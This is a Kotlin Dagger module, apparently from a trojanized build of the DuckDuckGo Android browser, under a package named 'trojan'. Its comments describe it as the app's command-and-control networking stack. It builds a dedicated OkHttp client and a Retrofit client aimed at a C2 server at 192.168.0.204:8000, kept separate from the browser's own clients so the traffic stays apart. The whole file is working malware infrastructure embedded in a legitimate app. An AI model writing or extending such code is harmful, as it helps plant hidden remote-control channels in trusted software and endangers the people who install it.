package com.duckduckgo.trojan.impl.di

import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.trojan.impl.C2ApiService
import com.squareup.anvil.annotations.ContributesTo
import dagger.Module
import dagger.Provides
import dagger.SingleInstanceIn
import okhttp3.OkHttpClient
import retrofit2.Retrofit
import retrofit2.converter.moshi.MoshiConverterFactory
import java.util.concurrent.TimeUnit
import javax.inject.Named

/**
 * Dagger module that provides the C2 networking stack.
 *
 * We create our OWN OkHttpClient and Retrofit instance, separate from DDG's.
 * DDG's clients point to duckduckgo.com with DDG-specific interceptors —
 * we don't want that for our C2 traffic.
 *
 * @Named("c2") qualifier ensures our instances don't collide with DDG's
 * @Named("api") and @Named("nonCaching") instances.
 */
@Module
@ContributesTo(AppScope::class)
object C2NetworkModule {

    @Provides
    @SingleInstanceIn(AppScope::class)
    @Named("c2")
    fun c2OkHttpClient(): OkHttpClient {
        return OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build()
    }

    @Provides
    @SingleInstanceIn(AppScope::class)
    @Named("c2")
    fun c2Retrofit(@Named("c2") okHttpClient: OkHttpClient): Retrofit {
        return Retrofit.Builder()
            .baseUrl("http://192.168.0.204:8000/")
            .client(okHttpClient)
            .addConverterFactory(MoshiConverterFactory.create())
            .build()
    }

    @Provides
    fun c2ApiService(@Named("c2") retrofit: Retrofit): C2ApiService {
        return retrofit.create(C2ApiService::class.java)
    }
}
